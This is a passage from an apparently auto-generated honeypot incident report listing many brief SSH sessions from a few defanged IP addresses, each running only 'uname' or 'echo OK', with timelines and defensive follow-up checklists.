| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:36:35` | `cowrie.session.connect` |
| `2026-06-27 10:36:35` | `cowrie.client.version` |
| `2026-06-27 10:36:35` | `cowrie.client.kex` |
| `2026-06-27 10:36:35` | `cowrie.login.success` |
| `2026-06-27 10:36:36` | `cowrie.session.params` |
| `2026-06-27 10:36:36` | `cowrie.command.input` |
| `2026-06-27 10:36:36` | `cowrie.log.closed` |
| `2026-06-27 10:36:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8928bf9c2259

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:37 |
| **Last Seen** | 2026-06-27 10:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:37:25` | `cowrie.session.connect` |
| `2026-06-27 10:37:25` | `cowrie.client.version` |
| `2026-06-27 10:37:25` | `cowrie.client.kex` |
| `2026-06-27 10:37:25` | `cowrie.login.success` |
| `2026-06-27 10:37:26` | `cowrie.session.params` |
| `2026-06-27 10:37:26` | `cowrie.command.input` |
| `2026-06-27 10:37:26` | `cowrie.log.closed` |
| `2026-06-27 10:37:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d30b0438226

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:38 |
| **Last Seen** | 2026-06-27 10:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:38:15` | `cowrie.session.connect` |
| `2026-06-27 10:38:15` | `cowrie.client.version` |
| `2026-06-27 10:38:15` | `cowrie.client.kex` |
| `2026-06-27 10:38:16` | `cowrie.login.success` |
| `2026-06-27 10:38:16` | `cowrie.session.params` |
| `2026-06-27 10:38:16` | `cowrie.command.input` |
| `2026-06-27 10:38:16` | `cowrie.log.closed` |
| `2026-06-27 10:38:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32268c0931e1

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:39 |
| **Last Seen** | 2026-06-27 10:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:39:07` | `cowrie.session.connect` |
| `2026-06-27 10:39:07` | `cowrie.client.version` |
| `2026-06-27 10:39:07` | `cowrie.client.kex` |
| `2026-06-27 10:39:07` | `cowrie.login.success` |
| `2026-06-27 10:39:08` | `cowrie.session.params` |
| `2026-06-27 10:39:08` | `cowrie.command.input` |
| `2026-06-27 10:39:08` | `cowrie.log.closed` |
| `2026-06-27 10:39:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f994fc15775e

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-27 10:39 |
| **Last Seen** | 2026-06-27 10:39 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:39:08` | `cowrie.session.connect` |
| `2026-06-27 10:39:09` | `cowrie.client.version` |
| `2026-06-27 10:39:09` | `cowrie.client.kex` |
| `2026-06-27 10:39:14` | `cowrie.login.success` |
| `2026-06-27 10:39:18` | `cowrie.session.params` |
| `2026-06-27 10:39:18` | `cowrie.command.input` |
| `2026-06-27 10:39:19` | `cowrie.log.closed` |
| `2026-06-27 10:39:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-571ab24040f9

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:40 |
| **Last Seen** | 2026-06-27 10:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:40:00` | `cowrie.session.connect` |
| `2026-06-27 10:40:00` | `cowrie.client.version` |
| `2026-06-27 10:40:00` | `cowrie.client.kex` |
| `2026-06-27 10:40:00` | `cowrie.login.success` |
| `2026-06-27 10:40:01` | `cowrie.session.params` |
| `2026-06-27 10:40:01` | `cowrie.command.input` |
| `2026-06-27 10:40:01` | `cowrie.log.closed` |
| `2026-06-27 10:40:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77676f83a742

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:40 |
| **Last Seen** | 2026-06-27 10:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:40:52` | `cowrie.session.connect` |
| `2026-06-27 10:40:52` | `cowrie.client.version` |
| `2026-06-27 10:40:52` | `cowrie.client.kex` |
| `2026-06-27 10:40:52` | `cowrie.login.success` |
| `2026-06-27 10:40:53` | `cowrie.session.params` |
| `2026-06-27 10:40:53` | `cowrie.command.input` |
| `2026-06-27 10:40:53` | `cowrie.log.closed` |
| `2026-06-27 10:40:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2ca292cd519

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:41 |
| **Last Seen** | 2026-06-27 10:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:41:44` | `cowrie.session.connect` |
| `2026-06-27 10:41:44` | `cowrie.client.version` |
| `2026-06-27 10:41:44` | `cowrie.client.kex` |
| `2026-06-27 10:41:44` | `cowrie.login.success` |
| `2026-06-27 10:41:45` | `cowrie.session.params` |
| `2026-06-27 10:41:45` | `cowrie.command.input` |
| `2026-06-27 10:41:45` | `cowrie.log.closed` |
| `2026-06-27 10:41:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-159dc9c225a3

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:42 |
| **Last Seen** | 2026-06-27 10:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:42:39` | `cowrie.session.connect` |
| `2026-06-27 10:42:39` | `cowrie.client.version` |
| `2026-06-27 10:42:39` | `cowrie.client.kex` |
| `2026-06-27 10:42:39` | `cowrie.login.success` |
| `2026-06-27 10:42:40` | `cowrie.session.params` |
| `2026-06-27 10:42:40` | `cowrie.command.input` |
| `2026-06-27 10:42:40` | `cowrie.log.closed` |
| `2026-06-27 10:42:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-259b120c05f6

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:43 |
| **Last Seen** | 2026-06-27 10:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:43:31` | `cowrie.session.connect` |
| `2026-06-27 10:43:31` | `cowrie.client.version` |
| `2026-06-27 10:43:31` | `cowrie.client.kex` |
| `2026-06-27 10:43:31` | `cowrie.login.success` |
| `2026-06-27 10:43:32` | `cowrie.session.params` |
| `2026-06-27 10:43:32` | `cowrie.command.input` |
| `2026-06-27 10:43:32` | `cowrie.log.closed` |
| `2026-06-27 10:43:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-527419b5065f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:44 |
| **Last Seen** | 2026-06-27 10:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:44:22` | `cowrie.session.connect` |
| `2026-06-27 10:44:22` | `cowrie.client.version` |
| `2026-06-27 10:44:22` | `cowrie.client.kex` |
| `2026-06-27 10:44:23` | `cowrie.login.success` |
| `2026-06-27 10:44:23` | `cowrie.session.params` |
| `2026-06-27 10:44:23` | `cowrie.command.input` |
| `2026-06-27 10:44:23` | `cowrie.log.closed` |
| `2026-06-27 10:44:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88732788c0b8

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:45 |
| **Last Seen** | 2026-06-27 10:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:45:14` | `cowrie.session.connect` |
| `2026-06-27 10:45:14` | `cowrie.client.version` |
| `2026-06-27 10:45:14` | `cowrie.client.kex` |
| `2026-06-27 10:45:14` | `cowrie.login.success` |
| `2026-06-27 10:45:15` | `cowrie.session.params` |
| `2026-06-27 10:45:15` | `cowrie.command.input` |
| `2026-06-27 10:45:15` | `cowrie.log.closed` |
| `2026-06-27 10:45:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7015a5f4f8c1

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]239` |
| **First Seen** | 2026-06-27 10:45 |
| **Last Seen** | 2026-06-27 10:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:45:28` | `cowrie.session.connect` |
| `2026-06-27 10:45:28` | `cowrie.client.version` |
| `2026-06-27 10:45:28` | `cowrie.client.kex` |
| `2026-06-27 10:45:29` | `cowrie.login.success` |
| `2026-06-27 10:45:30` | `cowrie.session.params` |
| `2026-06-27 10:45:30` | `cowrie.command.input` |
| `2026-06-27 10:45:30` | `cowrie.log.closed` |
| `2026-06-27 10:45:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]239` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]239` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77f21d7976b8

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:46 |
| **Last Seen** | 2026-06-27 10:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:46:08` | `cowrie.session.connect` |
| `2026-06-27 10:46:08` | `cowrie.client.version` |
| `2026-06-27 10:46:08` | `cowrie.client.kex` |
| `2026-06-27 10:46:08` | `cowrie.login.success` |
| `2026-06-27 10:46:09` | `cowrie.session.params` |
| `2026-06-27 10:46:09` | `cowrie.command.input` |
| `2026-06-27 10:46:09` | `cowrie.log.closed` |
| `2026-06-27 10:46:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d564c11ac50

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:47 |
| **Last Seen** | 2026-06-27 10:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:47:03` | `cowrie.session.connect` |
| `2026-06-27 10:47:03` | `cowrie.client.version` |
| `2026-06-27 10:47:03` | `cowrie.client.kex` |
| `2026-06-27 10:47:04` | `cowrie.login.success` |
| `2026-06-27 10:47:05` | `cowrie.session.params` |
| `2026-06-27 10:47:05` | `cowrie.command.input` |
| `2026-06-27 10:47:05` | `cowrie.log.closed` |
| `2026-06-27 10:47:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b076aad7773a

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-27 10:47 |
| **Last Seen** | 2026-06-27 10:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:47:13` | `cowrie.session.connect` |
| `2026-06-27 10:47:13` | `cowrie.client.version` |
| `2026-06-27 10:47:13` | `cowrie.client.kex` |
| `2026-06-27 10:47:15` | `cowrie.login.success` |
| `2026-06-27 10:47:16` | `cowrie.session.params` |
| `2026-06-27 10:47:16` | `cowrie.command.input` |
| `2026-06-27 10:47:17` | `cowrie.log.closed` |
| `2026-06-27 10:47:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9546fc2da32

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:47 |
| **Last Seen** | 2026-06-27 10:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:47:56` | `cowrie.session.connect` |
| `2026-06-27 10:47:56` | `cowrie.client.version` |
| `2026-06-27 10:47:56` | `cowrie.client.kex` |
| `2026-06-27 10:47:57` | `cowrie.login.success` |
| `2026-06-27 10:47:57` | `cowrie.session.params` |
| `2026-06-27 10:47:57` | `cowrie.command.input` |
| `2026-06-27 10:47:57` | `cowrie.log.closed` |
| `2026-06-27 10:47:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a97f44f9772

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:48 |
| **Last Seen** | 2026-06-27 10:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:48:49` | `cowrie.session.connect` |
| `2026-06-27 10:48:49` | `cowrie.client.version` |
| `2026-06-27 10:48:49` | `cowrie.client.kex` |
| `2026-06-27 10:48:49` | `cowrie.login.success` |
| `2026-06-27 10:48:50` | `cowrie.session.params` |
| `2026-06-27 10:48:50` | `cowrie.command.input` |
| `2026-06-27 10:48:50` | `cowrie.log.closed` |
| `2026-06-27 10:48:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31f8fbbe0486

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:49 |
| **Last Seen** | 2026-06-27 10:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:49:41` | `cowrie.session.connect` |
| `2026-06-27 10:49:41` | `cowrie.client.version` |
| `2026-06-27 10:49:41` | `cowrie.client.kex` |
| `2026-06-27 10:49:41` | `cowrie.login.success` |
| `2026-06-27 10:49:42` | `cowrie.session.params` |
| `2026-06-27 10:49:42` | `cowrie.command.input` |
| `2026-06-27 10:49:42` | `cowrie.log.closed` |
| `2026-06-27 10:49:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07599a0b79ca

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-27 10:49 |
| **Last Seen** | 2026-06-27 10:50 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:49:49` | `cowrie.session.connect` |
| `2026-06-27 10:49:50` | `cowrie.client.version` |
| `2026-06-27 10:49:50` | `cowrie.client.kex` |
| `2026-06-27 10:49:56` | `cowrie.login.success` |
| `2026-06-27 10:50:00` | `cowrie.session.params` |
| `2026-06-27 10:50:00` | `cowrie.command.input` |
| `2026-06-27 10:50:01` | `cowrie.log.closed` |
| `2026-06-27 10:50:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc0ae18ce2b4

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:50 |
| **Last Seen** | 2026-06-27 10:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:50:33` | `cowrie.session.connect` |
| `2026-06-27 10:50:33` | `cowrie.client.version` |
| `2026-06-27 10:50:33` | `cowrie.client.kex` |
| `2026-06-27 10:50:33` | `cowrie.login.success` |
| `2026-06-27 10:50:34` | `cowrie.session.params` |
| `2026-06-27 10:50:34` | `cowrie.command.input` |
| `2026-06-27 10:50:34` | `cowrie.log.closed` |
| `2026-06-27 10:50:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7509fa14d77e

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:51 |
| **Last Seen** | 2026-06-27 10:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:51:27` | `cowrie.session.connect` |
| `2026-06-27 10:51:27` | `cowrie.client.version` |
| `2026-06-27 10:51:27` | `cowrie.client.kex` |
| `2026-06-27 10:51:27` | `cowrie.login.success` |
| `2026-06-27 10:51:28` | `cowrie.session.params` |
| `2026-06-27 10:51:28` | `cowrie.command.input` |
| `2026-06-27 10:51:28` | `cowrie.log.closed` |
| `2026-06-27 10:51:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-731eec9ebddb

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:52 |
| **Last Seen** | 2026-06-27 10:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:52:25` | `cowrie.session.connect` |
| `2026-06-27 10:52:25` | `cowrie.client.version` |
| `2026-06-27 10:52:25` | `cowrie.client.kex` |
| `2026-06-27 10:52:25` | `cowrie.login.success` |
| `2026-06-27 10:52:26` | `cowrie.session.params` |
| `2026-06-27 10:52:26` | `cowrie.command.input` |
| `2026-06-27 10:52:26` | `cowrie.log.closed` |
| `2026-06-27 10:52:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5a9b7ecc78b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:53 |
| **Last Seen** | 2026-06-27 10:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:53:20` | `cowrie.session.connect` |
| `2026-06-27 10:53:20` | `cowrie.client.version` |
| `2026-06-27 10:53:20` | `cowrie.client.kex` |
| `2026-06-27 10:53:20` | `cowrie.login.success` |
| `2026-06-27 10:53:21` | `cowrie.session.params` |
| `2026-06-27 10:53:21` | `cowrie.command.input` |
| `2026-06-27 10:53:21` | `cowrie.log.closed` |
| `2026-06-27 10:53:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e084ed2db7ad

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:54 |
| **Last Seen** | 2026-06-27 10:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:54:14` | `cowrie.session.connect` |
| `2026-06-27 10:54:14` | `cowrie.client.version` |
| `2026-06-27 10:54:14` | `cowrie.client.kex` |
| `2026-06-27 10:54:14` | `cowrie.login.success` |
| `2026-06-27 10:54:15` | `cowrie.session.params` |
| `2026-06-27 10:54:15` | `cowrie.command.input` |
| `2026-06-27 10:54:15` | `cowrie.log.closed` |
| `2026-06-27 10:54:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84d037e67e3c

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:55 |
| **Last Seen** | 2026-06-27 10:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:55:07` | `cowrie.session.connect` |
| `2026-06-27 10:55:07` | `cowrie.client.version` |
| `2026-06-27 10:55:07` | `cowrie.client.kex` |
| `2026-06-27 10:55:08` | `cowrie.login.success` |
| `2026-06-27 10:55:08` | `cowrie.session.params` |
| `2026-06-27 10:55:08` | `cowrie.command.input` |
| `2026-06-27 10:55:08` | `cowrie.log.closed` |
| `2026-06-27 10:55:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56a768f1a666

| Field | Detail |
|---|---|
| **Source IP** | `118.26.111[.]107` |
